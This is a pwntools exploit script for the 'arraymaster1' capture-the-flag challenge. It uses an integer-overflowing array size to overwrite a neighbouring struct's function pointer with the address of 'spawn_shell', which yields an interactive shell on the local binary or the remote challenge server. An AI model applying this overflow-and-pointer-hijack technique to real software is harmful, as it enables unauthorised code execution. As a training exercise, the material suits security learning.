from pwn import *

BIN: str = "./arraymaster1"
HOST: str = "arraymaster1.challs.cyberchallenge.it"
PORT: int = 9125

# Struct content: len (+0), type (+8), p* (+16), get (+24), set (+32)

HACKY_SIZE: int = 2**64//8+1  # A size that wraps around when imul-ed with 8, the overflown result is 8

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)

def main():
  elf = ELF(BIN)
  b_set_offset = 4*8 + 32  # 4 blocks of 8 bytes plus set offset in the struct
  b_set_offset_bytes = b_set_offset//8
  p = get_target()
  p.clean()
  p.sendline(f"init A 64 {HACKY_SIZE}")
  p.sendline(b"init B 8 8")
  p.sendline(f"set A {b_set_offset_bytes} {elf.sym['spawn_shell']}")
  p.sendline(b"set B 1 1")
  print(p.clean())
  p.interactive()

if __name__ == "__main__":
  main()